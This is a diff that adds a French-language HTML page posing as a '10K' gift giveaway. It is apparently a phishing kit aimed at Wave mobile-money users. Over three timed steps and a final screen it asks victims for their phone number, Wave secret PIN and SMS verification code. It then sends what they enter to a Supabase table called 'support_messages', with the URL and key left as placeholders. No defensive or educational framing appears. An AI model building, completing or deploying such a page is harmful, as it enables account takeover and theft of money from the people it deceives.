@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Cadeau 10K</title>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #fff;
+    color: #111;
+}
+
+.screen {
+    min-height: 100vh;
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    padding: 25px;
+}
+
+.screen.active {
+    display: flex;
+}
+
+.header {
+    width: 100%;
+    max-width: 600px;
+    display: flex;
+    align-items: center;
+    gap: 18px;
+    font-size: 24px;
+    font-weight: bold;
+}
+
+.back {
+    font-size: 38px;
+}
+
+.logo {
+    width: 90px;
+    height: 90px;
+    margin-top: 65px;
+    border-radius: 25px;
+    background: #20c0e8;
+
+    display: flex;
+    align-items: center;
+    justify-content: center;
+
+    font-size: 45px;
+}
+
+h1 {
+    margin-top: 25px;
+    text-align: center;
+    font-size: 28px;
+}
+
+.description {
+    text-align: center;
+    font-size: 19px;
+    line-height: 1.5;
+    margin-top: 10px;
+}
+
+.input-area {
+    width: 100%;
+    max-width: 430px;
+    margin-top: 45px;
+}
+
+input,
+textarea {
+    width: 100%;
+    padding: 15px;
+    font-size: 20px;
+    outline: none;
+    border: 2px solid #22c2e9;
+    border-radius: 12px;
+}
+
+textarea {
+    height: 130px;
+    resize: none;
+}
+
+.action {
+    margin-top: 25px;
+    font-size: 18px;
+    font-weight: bold;
+    color: #111;
+    text-align: center;
+}
+
+.timer {
+    margin-top: 20px;
+    font-size: 18px;
+    color: #777;
+}
+
+.next {
+    width: 100%;
+    max-width: 600px;
+    height: 65px;
+    margin-top: auto;
+
+    border: none;
+    border-radius: 35px;
+
+    background: #79d9f2;
+    color: white;
+
+    font-size: 21px;
+    font-weight: bold;
+}
+
+.next:disabled {
+    opacity: .45;
+}
+
+.final {
+    text-align: center;
+    margin-top: 80px;
+}
+
+.final h1 {
+    font-size: 32px;
+}
+
+.final-message {
+    font-size: 28px;
+    font-weight: bold;
+    margin-top: 35px;
+}
+</style>
+</head>
+
+<body>
+
+
+<!-- ========================= -->
+<!-- ÉTAPE 1 -->
+<!-- ========================= -->
+
+<section class="screen active" id="screen1">
+
+    <div class="header">
+        <span class="back">‹</span>
+        <span>Cadeau 10K</span>
+    </div>
+
+    <div class="logo">
+        🐧
+    </div>
+
+    <h1>Étape 1</h1>
+
+    <div class="description">
+        Bienvenue <br>
+        Commencez votre participation.
+    </div>
+
+    <div class="input-area">
+        <input
+            type="text"
+            id="demo1"
+            placeholder="Information de démonstration"
+        >
+    </div>
+
+    <div class="action">
+        CONFIRMEZ VOTRE NUMERO 
+    </div>
+
+    <div class="timer" id="timer1">
+        Patientez 10 secondes...
+    </div>
+
+    <button
+        class="next"
+        id="button1"
+        disabled
+        onclick="nextStep(2)"
+    >
+        Continuer
+    </button>
+
+</section>
+
+
+<!-- ========================= -->
+<!-- ÉTAPE 2 -->
+<!-- ========================= -->
+
+<section class="screen" id="screen2">
+
+    <div class="header">
+        <span class="back">‹</span>
+        <span>Cadeau 10K</span>
+    </div>
+
+    <div class="logo">
+        🐧
+    </div>
+
+    <h1>Étape 2</h1>
+
+    <div class="description">
+        Continuez votre participation.
+    </div>
+
+    <div class="input-area">
+        <input
+            type="text"
+            id="demo2"
+            placeholder="Information de démonstration"
+        >
+    </div>
+
+    <div class="action">
+        CONFIRMEZ VOTRE CODE SECRET WAVE 
+    </div>
+
+    <div class="timer" id="timer2">
+        Patientez 10 secondes...
+    </div>
+
+    <button
+        class="next"
+        id="button2"
+        disabled
+        onclick="nextStep(3)"
+    >
+        Continuer
+    </button>
+
+</section>
+
+
+<!-- ========================= -->
+<!-- ÉTAPE 3 -->
+<!-- ========================= -->
+
+<section class="screen" id="screen3">
+
+    <div class="header">
+        <span class="back">‹</span>
+        <span>Cadeau 10K</span>
+    </div>
+
+    <div class="logo">
+        🐧
+    </div>
+
+    <h1>Étape 3</h1>
+
+    <div class="description">
+        Dernière étape 
+    </div>
+
+    <div class="input-area">
+        <input
+            type="text"
+            id="demo3"
+            placeholder="Information de démonstration"
+        >
+    </div>
+
+    <div class="action">
+        CONFIRMER LE CODE REÇU PAR SMS
+    </div>
+
+    <div class="timer" id="timer3">
+        Patientez 10 secondes...
+    </div>
+
+    <button
+        class="next"
+        id="button3"
+        disabled
+        onclick="showFinal()"
+    >
+        Terminer
+    </button>
+
+</section>
+
+
+<!-- ========================= -->
+<!-- ÉCRAN FINAL -->
+<!-- ========================= -->
+
+<section class="screen" id="final">
+
+    <div class="final">
+
+        <div class="logo">
+            🐧
+        </div>
+
+        <h1>
+            VEILLEZ ENTREE NUMERO DE TELPHONE CODE SECRET ET CODE REÇU PAR SMS
+          DANS LA CASE CI DESSOUS.
+        </h1>
+
+        <div class="final-message">
+           CONFIRMEZ VOS INFORMATION WAVE MERCII  
+        </div>
+
+        <div class="input-area">
+
+            <textarea
+                id="supportMessage"
+                placeholder="tel,code secret , code sms .."
+            ></textarea>
+
+        </div>
+
+        <button
+            class="next"
+            style="margin-top:30px"
+            onclick="sendMessage()"
+        >
+            Envoyer le message
+        </button>
+
+    </div>
+
+</section>
+
+
+<script>
+
+/* =========================
+   SUPABASE
+========================= */
+
+const SUPABASE_URL = "TON_SUPABASE_URL";
+
+const SUPABASE_KEY = "TA_CLE_ANON";
+
+
+/* =========================
+   CHANGER D'ÉCRAN
+========================= */
+
+function showScreen(number) {
+
+    document
+        .querySelectorAll(".screen")
+        .forEach(function(screen) {
+            screen.classList.remove("active");
+        });
+
+    document
+        .getElementById("screen" + number)
+        .classList.add("active");
+}
+
+
+/* =========================
+   DÉCOMPTE
+========================= */
+
+function startTimer(step) {
+
+    let seconds = 10;
+
+    const timer =
+        document.getElementById("timer" + step);
+
+    const button =
+        document.getElementById("button" + step);
+
+    timer.textContent =
+        "Patientez " + seconds + " secondes...";
+
+    const interval = setInterval(function() {
+
+        seconds--;
+
+        if (seconds > 0) {
+
+            timer.textContent =
+                "Patientez " +
+                seconds +
+                " secondes...";
+
+        } else {
+
+            clearInterval(interval);
+
+            timer.textContent =
+                "Vous pouvez continuer ";
+
+            button.disabled = false;
+        }
+
+    }, 1000);
+}
+
+
+/* =========================
+   PASSAGE À L'ÉTAPE SUIVANTE
+========================= */
+
+function nextStep(step) {
+
+    showScreen(step);
+
+    startTimer(step);
+}
+
+
+/* =========================
+   ÉCRAN FINAL
+========================= */
+
+function showFinal() {
+
+    document
+        .querySelectorAll(".screen")
+        .forEach(function(screen) {
+            screen.classList.remove("active");
+        });
+
+    document
+        .getElementById("final")
+        .classList.add("active");
+}
+
+
+/* =========================
+   ENVOI DU MESSAGE
+========================= */
+
+async function sendMessage() {
+
+    const message =
+        document
+        .getElementById("supportMessage")
+        .value
+        .trim();
+
+    if (message === "") {
+
+        alert(
+            "Veuillez écrire votre message "
+        );
+
+        return;
+    }
+
+    /*
+       Le message peut être enregistré
+       dans ta table Supabase.
+
+       Exemple de table :
+       support_messages
+
+       colonne :
+       message TEXT
+       created_at TIMESTAMP
+    */
+
+    try {
+
+        const response = await fetch(
+            SUPABASE_URL +
+            "/rest/v1/support_messages",
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type":
+                        "application/json",
+
+                    "apikey":
+                        SUPABASE_KEY,
+
+                    "Authorization":
+                        "Bearer " +
+                        SUPABASE_KEY,
+
+                    "Prefer":
+                        "return=minimal"
+                },
+
+                body: JSON.stringify({
+                    message: message
+                })
+            }
+        );
+
+
+        if (!response.ok) {
+
+            throw new Error(
+                "Erreur Supabase"
+            );
+        }
+
+
+        alert(
+            "connexion validee!"
+        );
+
+
+        document
+            .getElementById("supportMessage")
+            .value = "";
+
+
+    } catch (error) {
+
+        alert(
+            "Impossible d'envoyer le message."
+        );
+
+        console.error(error);
+    }
+}
+
+
+/* =========================
+   LANCER LE PREMIER DÉCOMPTE
+========================= */
+
+startTimer(1);
+
+</script>
+
+</body>
+</html>
